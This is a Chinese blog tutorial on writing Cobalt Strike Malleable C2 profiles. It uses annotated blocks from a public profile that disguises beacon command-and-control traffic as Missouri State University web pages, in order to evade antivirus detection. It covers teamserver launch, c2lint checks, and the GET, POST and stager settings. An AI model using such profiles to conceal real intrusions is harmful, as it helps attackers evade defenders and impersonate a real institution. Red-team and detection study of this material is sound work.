<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>关于Malleable C2的学习总结 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="关于Malleable C2的学习总结"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
        <li><a href="/links">Links</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>关于Malleable C2的学习总结</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2020/09/02/关于Malleable-C2的学习总结/" rel="bookmark">
        <time class="entry-date published" datetime="2020-09-02T02:27:15.000Z">
          2020-09-02
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>​        通过之前我们对于CobaltStrike的Beacon通信流程分析，我们可以看到CobaltStrike在使用心跳包发送active和match，执行命令的返回结果通过请求submit.php来进行传输，而且我们通过这两个包发送和接收的也是一些加密的内容，因此可能有些杀软可能会对这样的请求进行拦截，如果这样，那么无论我们之前对shellcode怎么免杀，只要和服务端产生一些通信，那么都有可能被拦截，因此我们需要修改掉这些流量特征，好在CobaltStrike已经给我们提供了这样的功能，那就是malleable C2。</p>
<span id="more"></span>

<h3 id="关于malleable-C2基本介绍"><a href="#关于malleable-C2基本介绍" class="headerlink" title="关于malleable C2基本介绍"></a>关于malleable C2基本介绍</h3><p><strong>什么是malleable C2?</strong></p>
<p>​        Beacon的HTTP的indicators由Malleable-C2-profile文件控制，关于Malleable-C2-profile，它是一个简单的配置文件，用来指定如何转换数据并将其存储在transaction中，转换和存储数据的相同配置文件也从transaction中提取和恢复。 也就是说当Beacon使用HTTP进行通信时，可以通过Malleable-C2来控制如何接收和发送指令。</p>
<p><strong>为什么要使用malleable C2?</strong></p>
<p>​        因为我们使用默认beacon通信方式可以看到存在一些特征，所以我们需要通过需改Malleable-C2来更改流量的特征，让beacon和CoblatStrike服务端的通信流量尽量来模拟正常的访问通信，要实现这个功能，可以通过编写malleable-C2-profile来实现。</p>
<h3 id="malleable-C2-profile的编写分析"><a href="#malleable-C2-profile的编写分析" class="headerlink" title="malleable C2-profile的编写分析"></a>malleable C2-profile的编写分析</h3><p><strong>如何使用malleable C2-profile文件?</strong></p>
<p>​        我以网上公开的profile为例进行分析，<a target="_blank" rel="noopener" href="https://github.com/xx0hcd/Malleable-C2-Profiles">github地址</a>,下载后normal\msu_edu.profile来进行分析</p>
<p>​        当我们启动团队服务器时，可以使用如下命令来加载Malleable-C2-profile文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver [external IP] [password] [/path/to/my.profile]</span><br></pre></td></tr></table></figure>

<p>​        将normal\msu_edu.profile上传到服务器，使用上面的命令可以加载，但是在加载之前首先要测试这个profile文件的内容格式是否有问题，可以通过c2lint命令来检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint xxxx.profile </span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170520452.png" alt="image-20200902170520452"></p>
<p>​        测试过程中+代表测试通过，%代表提醒的内容，！代表不通过的选项</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170554118.png" alt="image-20200902170554118"></p>
<p>​        检查通过以后，我们通过下面的命令启动teamserver并且加载 malleable-C2-profile文件 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teamserver  ip password msu_edu.profile </span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170742151.png" alt="image-20200902170742151"></p>
<p><strong>如何编写一个Malleable-C2-profile文件？</strong></p>
<p>​        打开后文件的开头如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;msu_edu.profile&quot;;  //通过set给变量sample_name进行赋值</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;37500&quot;;   //设置睡眠时间为37秒左右</span><br><span class="line">set jitter    &quot;33&quot;;     //设置抖动率，为了防止请求时间过于规律，在这里设置抖动率为33%</span><br><span class="line">set useragent &quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko)   Chrome/41.0.2228.0 Safari/537.36&quot;;  //设置user-agent</span><br><span class="line"></span><br><span class="line">#set host_stage &quot;false&quot;;  //如果不需要分阶段传输payload，就可以在这里将host_stage的值设置为false</span><br><span class="line"></span><br><span class="line">###DNS options###</span><br><span class="line">set dns_idle &quot;8.8.8.8&quot;;   </span><br><span class="line">set maxdns    &quot;245&quot;;  //通过dns传输数据时主机名的最大长度</span><br><span class="line">set dns_sleep &quot;0&quot;; //在每个dns请求之间设置延时，这里没有延时</span><br><span class="line">set dns_stager_prepend &quot;&quot;; //在dns payload之前插入内容</span><br><span class="line">set dns_stager_subhost &quot;&quot;; //设置dns txt record stager的子域名</span><br><span class="line">set dns_max_txt &quot;252&quot;; //设置dns txt返回最大长度</span><br><span class="line">set dns_ttl &quot;1&quot;; //设置DNS响应的ttl的值</span><br><span class="line"></span><br><span class="line">###SMB options###</span><br><span class="line">set pipename &quot;ntsvcs&quot;;  //在使用Smb beacon来进行通信时，设置命名管道的名字</span><br><span class="line">set pipename_stager &quot;scerpc&quot;;  //设置stager使用的管道名</span><br><span class="line"></span><br><span class="line">###TCP options###</span><br><span class="line">set tcp_port &quot;8000&quot;;  //设置tcp_beacon监听的端口，这里设置的是8000</span><br></pre></td></tr></table></figure>

<p>​        通过上面的配置，我们实现了以37秒为基准，百分之33左右的抖动率的功能，并且使用smb beacon时，默认的命名管道名字为ntsvcs</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902171550504.png" alt="image-20200902171550504"></p>
<p>​        当使用tcp beacon时，默认的端口是8000</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902171657470.png" alt="image-20200902171657470"></p>
<p>​        并且默认的user-agent将使用我们上面配置的.</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172224238.png" alt="image-20200902172224238">    </p>
<p>​        我们继续分析，看看后面的配置文件,下面的配置文件主要用来配置证书和response header</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">###SSL Options### //这个主要是给https beacon使用的配置</span><br><span class="line">#https-certificate &#123;</span><br><span class="line">    #set keystore &quot;your_store_file.store&quot;;  //java kerstore文件</span><br><span class="line">    #set password &quot;your_store_pass&quot;; //keystore文件的打开密码</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#https-certificate &#123;  //自签名的https证书配置</span><br><span class="line">#    set C &quot;US&quot;;   //国家</span><br><span class="line">#    set CN &quot;whatever.com&quot;; //域名</span><br><span class="line">#    set L &quot;California&quot;; //地区</span><br><span class="line">#    set O &quot;whatever LLC.&quot;;  //组织名</span><br><span class="line">#    set OU &quot;local.org&quot;; //组织单位名称</span><br><span class="line">#    set ST &quot;CA&quot;; //州或者省</span><br><span class="line">#   set validity &quot;365&quot;; //时效</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#code-signer &#123;  //代码签名</span><br><span class="line">    #set keystore &quot;your_keystore.jks&quot;; // java kerstore文件</span><br><span class="line">    #set password &quot;your_password&quot;;  //keystore文件的打开密码</span><br><span class="line">    #set alias &quot;server&quot;;  //</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">###HTTP-Config Block###  //配置reponse header块</span><br><span class="line">http-config &#123;</span><br><span class="line">    #set headers &quot;Server, Content-Type&quot;;  </span><br><span class="line">    #header &quot;Content-Type&quot; &quot;text/html;charset=UTF-8&quot;;</span><br><span class="line">    #header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line"></span><br><span class="line">    set trust_x_forwarded_for &quot;false&quot;;  //如果teamserver使用了http重定向器，就需要选择true</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​        下面我们来配置GET请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-GET Block###</span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;/siteindex/a/ /siteindex/b/ /siteindex/c/&quot;;  //配置请求的Uri路径</span><br><span class="line"></span><br><span class="line">    #set verb &quot;POST&quot;; //用什么方法传输数据，不仅可以配置为get也可以配置为post</span><br><span class="line">    </span><br><span class="line">    client &#123;  //client端的配置</span><br><span class="line"></span><br><span class="line">        header &quot;Host&quot; &quot;search.missouristate.edu&quot;;  </span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">	   </span><br><span class="line">    metadata &#123; //metadata是一段加密的数据，但是没有编码，所以他不能在请求头和URI中发送。需要使用base64、base64url或者netbios编码之后才能在请求头和URI中发送。</span><br><span class="line">        #base64</span><br><span class="line">        base64url;  // 使用URL-safe Base64 进行编码</span><br><span class="line">        #mask;</span><br><span class="line">        #netbios;</span><br><span class="line">        #netbiosu;</span><br><span class="line">        #prepend &quot;TEST123&quot;;  //开头插入字符串</span><br><span class="line">        #append &quot;.php&quot;; //末尾追加字符串</span><br><span class="line"></span><br><span class="line">        parameter &quot;filter&quot;; //把数据放到名为filter的uri参数中</span><br><span class="line">        #header &quot;Cookie&quot;; //把数据放到名为Cookie的http头中</span><br><span class="line">        #uri-append; //把数据直接追加到URI上</span><br><span class="line"></span><br><span class="line">        #print;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #parameter &quot;test1&quot; &quot;test2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;  //server端的请求配置</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text/html; charset=utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS/8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE=edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        header &quot;Set-Cookie&quot; &quot;WWW-SERVERID=handle; path=/&quot;;</span><br><span class="line"> </span><br><span class="line">        output &#123;</span><br><span class="line"></span><br><span class="line">            netbios;</span><br><span class="line">            #netbiosu;</span><br><span class="line">            #base64;</span><br><span class="line">            #base64url;</span><br><span class="line">            #mask;</span><br><span class="line">  </span><br><span class="line">            prepend &quot;    &lt;link href=\&quot;/resource/styles\&quot; media=\&quot;all\&quot; rel=\&quot;stylesheet\&quot; /&gt;    &lt;script src=\&quot;https://missouristate.info/scripts/2018/common.js?_q=&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta name=\&quot;robots\&quot; content=\&quot;noindex\&quot; /&gt;&lt;link rel=\&quot;Stylesheet\&quot; media=\&quot;all\&quot; href=\&quot;https://missouristate.info/styles/msuwds/main-sgf.css\&quot; /&gt;\n&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta name=\&quot;vireport\&quot; content=\&quot;width=device-width, initial-scale=1.0\&quot; /&gt;\n&quot;;   </span><br><span class="line">            prepend &quot;    &lt;title&gt;A - Site Index - Missouri State University&lt;/title&gt;\n&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta charset=\&quot;UTF-8\&quot; /&gt;\n&quot;;</span><br><span class="line">            prepend &quot;&lt;head&gt;&quot;;     	       </span><br><span class="line">	    prepend &quot;&lt;html lang=\&quot;en\&quot; itemscope itemtype=\&quot;https://schema.org/SearchResultsPage\&quot;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;&lt;!DOCTYPE html&gt;\n&quot;;</span><br><span class="line"></span><br><span class="line">	    append &quot;\&quot;&gt;&lt;/script&gt;\n&quot;;</span><br><span class="line">            append &quot;&lt;h2&gt;About search&lt;/h2&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;ul&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href=\&quot;https://www.missouristate.edu/web/search/aboutwebsearch.htm\&quot;&gt;About web search&lt;/a&gt;&lt;/li&gt;]n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href=\&quot;https://www.missouristate.edu/web/search/aboutpeoplesearch.htm\&quot;&gt;About people search&lt;/a&gt;&lt;/li&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href=\&quot;https://www.missouristate.edu/web/search/abouteventsearch.htm\&quot;&gt;About event search&lt;/a&gt;&lt;/li&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href=\&quot;https://www.missouristate.edu/web/search/aboutmapsearch.htm\&quot;&gt;About map search&lt;/a&gt;&lt;/li&gt;&quot;;</span><br><span class="line">	    append &quot;&lt;/ul&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;/div&gt;&quot;;</span><br><span class="line"></span><br><span class="line">            print;  //以print为结束</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        通过上面的HTTP-GET块的配置，我们配置了心跳包的请求URI为/siteindex/a/，并且设置了通过filter字段来传输信息，并且返回包的内容也和我们在server部分的配置相同。这里有一个点需要注意，就是在使用prepend在返回包中添加内容时，在多个prepend字段配置中,prepend字段添加的越早，显示时越在后面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">       prepend &quot;    &lt;link href=\&quot;/resource/styles\&quot; media=\&quot;all\&quot; rel=\&quot;stylesheet\&quot; /&gt;    &lt;script src=\&quot;https://missouristate.info/scripts/2018/common.js?_q=&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta name=\&quot;robots\&quot; content=\&quot;noindex\&quot; /&gt;&lt;link rel=\&quot;Stylesheet\&quot; media=\&quot;all\&quot; href=\&quot;https://missouristate.info/styles/msuwds/main-sgf.css\&quot; /&gt;\n&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta name=\&quot;vireport\&quot; content=\&quot;width=device-width, initial-scale=1.0\&quot; /&gt;\n&quot;;   </span><br><span class="line">       prepend &quot;    &lt;title&gt;A - Site Index - Missouri State University&lt;/title&gt;\n&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta charset=\&quot;UTF-8\&quot; /&gt;\n&quot;;</span><br><span class="line">       prepend &quot;&lt;head&gt;&quot;;     	       </span><br><span class="line">prepend &quot;&lt;html lang=\&quot;en\&quot; itemscope itemtype=\&quot;https://schema.org/SearchResultsPage\&quot;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;&lt;!DOCTYPE html&gt;\n&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172951017.png" alt="image-20200902172951017"></p>
<p>​        我们再看一下当我们向client发送指令时的数据包,我们可以看到server端传递的请求在参数q中</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902180603819.png" alt="image-20200902180603819"></p>
<p>​        当客户端收到指令时，一般通过post来向服务端返回命令执行的结果，这部分可以通过http-post部分来配置，配置过程如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-Post Block###</span><br><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;/getsearchresults&quot;;  //配置post请求的uri</span><br><span class="line">    #set verb &quot;GET&quot;;</span><br><span class="line">    set verb &quot;POST&quot;;  //配置请求的形式</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">#	header &quot;Host&quot; &quot;search.missouristate.edu&quot;;    //配置请求头的信息</span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;  </span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en-US&quot;;   </span><br><span class="line">        </span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;   // URL-safe Base64 编码形式输出</span><br><span class="line">	    parameter &quot;site_indexFilter&quot;;  //将数据放到site_indexFilter参数中进行传输</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        id &#123; //通过id标识应该输出到哪个beacon</span><br><span class="line">	    base64url;   </span><br><span class="line">	    parameter &quot;peopleFilter&quot;;  //将数据放到peopleFilter参数中进行传输</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    parameter &quot;eventsFilter&quot; &quot;campus:sgf&quot;;    //配置一些其他的请求参数和参数值</span><br><span class="line">#    parameter &quot;mapFilter&quot; &quot;campus&quot;;</span><br><span class="line">    parameter &quot;query&quot; &quot;my%20missouri%20state&quot;;</span><br><span class="line">    parameter &quot;resultCounts&quot; &quot;5,3,3,3&amp;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/json; charset=utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent,AcceptEncoding&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS/8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE=edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;  //通过netbios传输信息 </span><br><span class="line">	   </span><br><span class="line">	    prepend &quot;[\&quot;&#123;\\\&quot;results\\\&quot;:[\\\&quot;&#123;\\\\\\\&quot;ID\\\\\\\&quot;:\\\\\\\&quot;Missouri State University Foundation\\\\\\\&quot;,\\\\\\\&quot;Name\\\\\\\&quot;:\\\\\\\&quot;Missouri State University Foundation\\\\\\\&quot;,\\\\\\\&quot;Url\\\\\\\&quot;:\\\\\\\&quot;https://www.missouristatefoundation.org/\\\\\\\&quot;,\\\\\\\&quot;Keywords\\\\\\\&quot;:&quot;;</span><br><span class="line"></span><br><span class="line">	    append &quot;\&quot;\\\\\\\&quot;development; endowment; foundation; Foundation, Missouri State; fundraising; missouri state foundation; missouri state university foundation\\\\\\\&quot;,\\\\\\\&quot;UnitType\\\\\\\&quot;:\\\\\\\&quot;Department\\\\\\\&quot;&#125;\\\&quot;,\\\&quot;&#123;\\\\\\\&quot;ID\\\\\\\&quot;:\\\\\\\&quot;Missouri State Outreach\\\\\\\&quot;,\\\\\\\&quot;Name\\\\\\\&quot;:\\\\\\\&quot;Missouri State Outreach\\\\\\\&quot;,\\\\\\\&quot;Url\\\\\\\&quot;:\\\\\\\&quot;https://outreach.missouristate.edu/\\\\\\\&quot;,\\\\\\\&quot;Keywords\\\\\\\&quot;:\\\\\\\&quot;distance learning; dual credit; evening; extended campus; Extended Campus (now Missouri State Outreach); i courses; i-courses; icourses; interactive video; itv; non credit; non-credit; noncredit; off campus; off-campus; offcampus; online; outreach; Outreach, Missouri State\\\\\\\&quot;&#125;\&quot;]&quot;;</span><br><span class="line"></span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​         通过上面对于http-post的配置，我们可以看到通过post的方式请求getsearchresults这个uri,并且在请求中加入了site_indexFilter字段，这个字段用来传输命令执行的结果。通过peopleFilter这个字段来返回beacon client对应的id。并且加上了query和resultCounts这两个参数，不过这两个参数的内容都是写死的。最后在server部分我们配置了返回的内容。我们使用wireshark来看下请求的内容与我们的配置是否一致</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902180954689.png" alt="image-20200902180954689"></p>
<p>​        下面我们配置http-stager的信息，我们可以在下面的代码块中定义自己下载stage的行为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-Stager Block###</span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">    set uri_x86 &quot;/Events&quot;;  //当下在x86的stage时，请求的uri</span><br><span class="line">    set uri_x64 &quot;/events&quot;;  //当下在x64的stage时，请求的uri</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;search.missouristate.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">        #parameter &quot;test1&quot; &quot;test2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;  //配置server返回stage的格式</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS/8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE=edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        header &quot;Set-Cookie&quot; &quot;WWW-SERVERID=handle; path=/&quot;;  </span><br><span class="line"></span><br><span class="line">        output &#123;  //对输出的内容进行配置，这里并没有加上其他的处理</span><br><span class="line">        </span><br><span class="line">            #prepend &quot;content=&quot;;  </span><br><span class="line"></span><br><span class="line">            #append &quot;&lt;/script&gt;\n&quot;;</span><br><span class="line">            print;   </span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        通过上面的HTTP-Stager的配置后,当stager去请求下载stage时，请求/Events这个uri，并且host的内容都和我们设置的在HTTP-Stager的client中配置的一致。再看看返回包中的内容，请求头中的内容也和我们配置的server部分一致。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172033813.png" alt="image-20200902172033813"></p>
<p>​        再看看可扩展的pe和躲避杀软的模块</p>
